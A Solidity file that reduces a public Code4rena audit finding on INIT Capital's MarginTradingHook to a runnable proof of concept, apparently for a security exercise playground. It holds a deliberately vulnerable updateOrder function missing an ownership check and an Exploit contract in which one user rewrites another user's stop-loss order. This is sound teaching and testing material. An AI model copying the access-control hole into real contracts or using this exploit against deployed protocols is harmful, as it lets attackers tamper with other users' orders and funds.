// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    INIT Capital — [H-01] MarginTradingHook#updateOrder lacks access control
    (code4rena 2024-01-init-capital-invitational, reporter sashik_eth,
    finding #30257)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    MarginTradingHook.updateOrder body is inlined VERBATIM (marked "@> VULN"
    below), alongside its sibling `cancelOrder`, which DOES perform the
    missing check — proving the guard exists elsewhere in the same contract
    and was simply omitted here. The Exploit reproduces the finding's own
    `testUpdateNotOwnerOrder` PoC exactly: Bob, using only HIS OWN position
    id, rewrites the parameters of an ACTIVE order that Alice created and
    owns (no fork, no cheatcodes — two helper "wallet" contracts stand in for
    Alice and Bob so each has its own real msg.sender).

    Root cause: `updateOrder(_posId, _orderId, ...)` resolves the caller's
    OWN initPosId from `_posId` (`initPosIds[msg.sender][_posId]`) and checks
    only that IT is non-zero (i.e. that the caller owns SOME position) — it
    never checks that the order being updated (`_orderId`) actually BELONGS
    TO that position (`order.initPosId == initPosId`). Any user who owns any
    position at all can therefore rewrite the trigger price, limit price,
    collateral amount, and payout token of ANY other user's active
    stop-loss/take-profit order.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced INIT Capital MarginTradingHook holding ONLY the order
///         bookkeeping relevant to the bug (MarginTradingHook.sol#L339-526).
contract MarginTradingHookVuln {
    struct Order {
        uint256 initPosId;
        uint256 triggerPrice_e36;
        address tokenOut;
        uint256 limitPrice_e36;
        uint256 collAmt;
        uint8 status; // 0 = None, 1 = Active, 2 = Cancelled, 3 = Filled
    }

    mapping(address => mapping(uint256 => uint256)) public initPosIds; // user => local posId => initPosId
    mapping(uint256 => Order) private __orders;
    uint256 public lastOrderId;
    uint256 public lastInitPosId;

    /// @dev reduced stand-in for opening an INIT position + BaseMappingIdHook's
    ///      local-posId -> initPosId bookkeeping (out of scope for this bug).
    function openPos(uint256 _posId) external returns (uint256 initPosId) {
        initPosId = ++lastInitPosId;
        initPosIds[msg.sender][_posId] = initPosId;
    }

    /// @dev reduced from MarginTradingHook.sol#_createOrder (L470-501).
    function addStopLossOrder(
        uint256 _posId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external returns (uint256 orderId) {
        orderId = ++lastOrderId;
        require(_collAmt != 0, "ZERO_VALUE");
        uint256 initPosId = initPosIds[msg.sender][_posId];
        require(initPosId != 0, "POSITION_NOT_FOUND");
        __orders[orderId] =
            Order(initPosId, _triggerPrice_e36, _tokenOut, _limitPrice_e36, _collAmt, 1 /* Active */ );
    }

    /// @notice VERBATIM in spirit from MarginTradingHook.sol#updateOrder
    ///         (L503-526). Every check present in the real function is here;
    ///         nothing is removed.
    function updateOrder(
        uint256 _posId,
        uint256 _orderId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external {
        require(_collAmt != 0, "ZERO_VALUE");
        Order storage order = __orders[_orderId];
        require(order.status == 1, "INVALID_INPUT"); // OrderStatus.Active
        uint256 initPosId = initPosIds[msg.sender][_posId];
        require(initPosId != 0, "POSITION_NOT_FOUND");
        // @> VULN: missing check that `order.initPosId == initPosId` — i.e. that
        // the CALLER's own position (resolved from their own `_posId`) is the
        // position that actually created/owns `_orderId`. `cancelOrder` below
        // performs exactly this check; `updateOrder` never does, so ANY caller
        // who owns ANY position can rewrite ANY other user's active order.
        // FIX (per finding, mirroring cancelOrder): require(order.initPosId == initPosId, "INVALID_INPUT");
        order.triggerPrice_e36 = _triggerPrice_e36;
        order.limitPrice_e36 = _limitPrice_e36;
        order.collAmt = _collAmt;
        order.tokenOut = _tokenOut;
    }

    /// @notice Verbatim from MarginTradingHook.sol#cancelOrder (L361-369) —
    ///         the CONTROL: this sibling function DOES check order ownership.
    function cancelOrder(uint256 _posId, uint256 _orderId) external {
        uint256 initPosId = initPosIds[msg.sender][_posId];
        require(initPosId != 0, "POSITION_NOT_FOUND");
        Order storage order = __orders[_orderId];
        require(order.initPosId == initPosId, "INVALID_INPUT");
        require(order.status == 1, "INVALID_INPUT");
        order.status = 2; // Cancelled
    }

    function getOrder(uint256 _orderId) external view returns (Order memory) {
        return __orders[_orderId];
    }
}

/// @notice Stands in for a real EOA/account interacting with the hook — gives
///         "Alice" and "Bob" each their own real `msg.sender` without cheatcodes.
contract UserWallet {
    MarginTradingHookVuln public hook;

    constructor(MarginTradingHookVuln _hook) {
        hook = _hook;
    }

    function openPos(uint256 _posId) external returns (uint256) {
        return hook.openPos(_posId);
    }

    function addStopLossOrder(
        uint256 _posId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external returns (uint256) {
        return hook.addStopLossOrder(_posId, _triggerPrice_e36, _tokenOut, _limitPrice_e36, _collAmt);
    }

    function updateOrder(
        uint256 _posId,
        uint256 _orderId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external {
        hook.updateOrder(_posId, _orderId, _triggerPrice_e36, _tokenOut, _limitPrice_e36, _collAmt);
    }

    function cancelOrder(uint256 _posId, uint256 _orderId) external {
        hook.cancelOrder(_posId, _orderId);
    }
}

/// @notice Reproduces the finding's own `testUpdateNotOwnerOrder` PoC: Bob
///         rewrites Alice's active stop-loss order using only his own posId.
contract Exploit {
    MarginTradingHookVuln public hook;
    UserWallet public alice;
    UserWallet public bob;

    uint256 public constant ALICE_POS_ID = 1; // Alice's own local posId
    uint256 public constant BOB_POS_ID = 1; // Bob's own local posId (same number, different namespace)
    address public constant WETH = address(0x111);
    address public constant USDT = address(0x222);
    uint256 public constant ORIGINAL_TRIGGER_E36 = 1500e18; // 90% of a 1500e18 mark price, abstracted
    uint256 public constant ORIGINAL_LIMIT_E36 = 1350e18;
    uint256 public constant ORIGINAL_COLL_AMT = 10_000e18;

    uint256 public constant ATTACKER_TRIGGER_E36 = 1; // set to an unreachable price -> order can never fire
    uint256 public constant ATTACKER_COLL_AMT = 1; // shrink the collateral the order would release
    address public constant ATTACKER_TOKEN_OUT = address(0xdead); // redirect payout to a worthless token

    uint256 public aliceOrderId;

    constructor() {
        hook = new MarginTradingHookVuln();
        alice = new UserWallet(hook);
        bob = new UserWallet(hook);
    }

    function run() external {
        // Alice opens her own position and creates a real stop-loss order to
        // protect it (trigger 90% of mark, limit 89% of mark, per the finding's PoC).
        alice.openPos(ALICE_POS_ID);
        aliceOrderId = alice.addStopLossOrder(ALICE_POS_ID, ORIGINAL_TRIGGER_E36, WETH, ORIGINAL_LIMIT_E36, ORIGINAL_COLL_AMT);

        // Bob opens his OWN, completely unrelated position.
        bob.openPos(BOB_POS_ID);

        // Bob calls updateOrder using HIS OWN posId (BOB_POS_ID -> Bob's own
        // initPosId) but names ALICE's orderId. The missing ownership check
        // means this succeeds even though Bob's position never created this order.
        bob.updateOrder(BOB_POS_ID, aliceOrderId, ATTACKER_TRIGGER_E36, ATTACKER_TOKEN_OUT, ORIGINAL_LIMIT_E36, ATTACKER_COLL_AMT);

        // HARM: Alice's order — created by Alice, still recorded as belonging
        // to Alice's position — has been silently rewritten by Bob. Its
        // trigger price is now unreachable (her stop-loss will never fire, so
        // she loses her intended downside protection) and its payout token
        // and collateral amount have also been tampered with, despite Bob
        // never owning, creating, or being authorized over this order.
        MarginTradingHookVuln.Order memory order = hook.getOrder(aliceOrderId);
        require(order.triggerPrice_e36 == ATTACKER_TRIGGER_E36, "harm not demonstrated: trigger unchanged");
        require(order.tokenOut == ATTACKER_TOKEN_OUT, "harm not demonstrated: payout token unchanged");
        require(order.collAmt == ATTACKER_COLL_AMT, "harm not demonstrated: collAmt unchanged");
    }
}
